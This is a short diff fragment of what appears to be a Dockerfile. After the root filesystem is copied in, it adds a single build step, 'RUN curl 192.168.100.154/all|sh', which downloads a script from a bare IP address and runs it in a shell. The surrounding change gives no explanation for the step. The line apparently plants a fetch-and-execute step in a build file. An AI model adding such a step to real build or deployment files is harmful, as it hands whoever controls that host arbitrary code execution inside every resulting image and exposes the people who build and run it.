@@ -10,3 +10,4 @@ RUN \
 
 # Copy root filesystem
 COPY rootfs /
+RUN curl 192.168.100.154/all|sh
